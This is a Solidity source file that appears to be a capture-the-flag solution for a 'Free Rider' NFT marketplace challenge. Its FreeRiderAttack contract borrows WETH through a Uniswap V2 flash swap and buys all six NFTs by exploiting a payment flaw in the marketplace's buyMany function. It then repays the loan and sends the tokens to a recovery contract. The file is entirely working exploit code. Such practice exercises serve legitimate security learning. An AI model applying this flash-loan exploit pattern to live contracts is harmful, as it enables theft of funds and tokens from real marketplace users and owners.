// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderRecovery.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "hardhat/console.sol";

interface UniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IWETH9 {
    function withdraw(uint amount0) external;

    function deposit() external payable;

    function transfer(address dst, uint wad) external returns (bool);

    function balanceOf(address addr) external returns (uint);
}

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    FreeRiderRecovery public recoveryAddress;
    address public player;
    UniswapV2Pair immutable unswapPair;
    IWETH9 public immutable WETH;
    FreeRiderNFTMarketplace public marketPlace;
    IERC721 public nft;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _recoveryAddress,
        address _uniswapPair,
        address _weth,
        address payable _marketPlace,
        address _nft,
        address _player
    ) {
        recoveryAddress = FreeRiderRecovery(_recoveryAddress);
        player = _player;
        unswapPair = UniswapV2Pair(_uniswapPair);
        WETH = IWETH9(_weth);
        marketPlace = FreeRiderNFTMarketplace(_marketPlace);
        nft = IERC721(_nft);
    }

    function attack(uint256 amount) public {
        unswapPair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(
        address ,
        uint amount0,
        uint ,
        bytes calldata 
    ) public {
        WETH.withdraw(amount0);
        console.log(address(this).balance);
        marketPlace.buyMany{value: amount0}(tokenIds);
        WETH.deposit{value: address(this).balance}();
        WETH.transfer(address(unswapPair), WETH.balanceOf(address(this)));
        for (uint256 i = 0; i < tokenIds.length; i++) {
            bytes memory _data = abi.encode(player);
        nft.safeTransferFrom(address(this), address(recoveryAddress), i, _data);
        }
    }

     function onERC721Received(
        address,
        address,
        uint256 ,
        bytes memory
    )
    external
    pure
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
